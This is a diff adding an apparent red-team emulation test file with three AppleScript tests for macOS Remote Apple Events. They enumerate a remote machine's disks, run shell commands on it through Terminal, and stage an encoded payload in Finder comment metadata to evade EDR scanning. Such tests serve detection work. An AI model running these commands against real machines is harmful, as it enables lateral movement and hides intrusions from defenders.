@@ -1,0 +1,40 @@
+name: "Remote Services: Remote Apple Events"
+tests:
+  - name: Enumerate remote volumes via RAE
+    language: AppleScript
+    references:
+      - https://blog.talosintelligence.com/bad-apples-weaponizing-native-macos-primitives-for-movement-and-execution/
+    description: Remotely query the Finder for a list of mounted volumes on a target machine using Remote Apple Events (RAE) via the eppc:// protocol. Actions performed via Apple Events bypass security telemetry focused on process execution trees, making RAE a discreet lateral movement vector.
+    command: |
+      tell application "Finder" of machine "eppc://#{target}"
+        get name of every disk
+      end tell
+    args:
+      target: "192.168.1.1"
+
+  - name: Remote execution via Terminal proxy via RAE
+    language: AppleScript
+    references:
+      - https://blog.talosintelligence.com/bad-apples-weaponizing-native-macos-primitives-for-movement-and-execution/
+    description: Use Terminal.app as a remote execution proxy via Remote Apple Events (RAE) to bypass the -10016 Handler Error that prevents System Events from executing shell commands remotely. Terminal.app accepts do script commands over the eppc:// protocol and is designed for shell interaction.
+    command: |
+      tell application "Terminal" of machine "eppc://#{target}"
+        do script "#{command}"
+      end tell
+    args:
+      target: "192.168.1.1"
+      command: "whoami"
+
+  - name: Remote Finder comment staging via RAE
+    language: AppleScript
+    references:
+      - https://blog.talosintelligence.com/bad-apples-weaponizing-native-macos-primitives-for-movement-and-execution/
+    description: Stage a Base64-encoded payload in the Finder comment (kMDItemFinderComment) of a newly created file on a remote machine via Remote Apple Events (RAE). Because the payload resides in Spotlight metadata rather than the file's data fork, it evades file-based EDR scanning of the target's filesystem.
+    command: |
+      tell application "Finder" of machine "eppc://#{target}"
+        set comment of (make new file at desktop with properties {name:"#{filename}"}) to "#{encodedPayload}"
+      end tell
+    args:
+      target: "192.168.1.1"
+      filename: "stage.txt"
+      encodedPayload: "ZWNobyBoZWxsbyB3b3JsZA=="
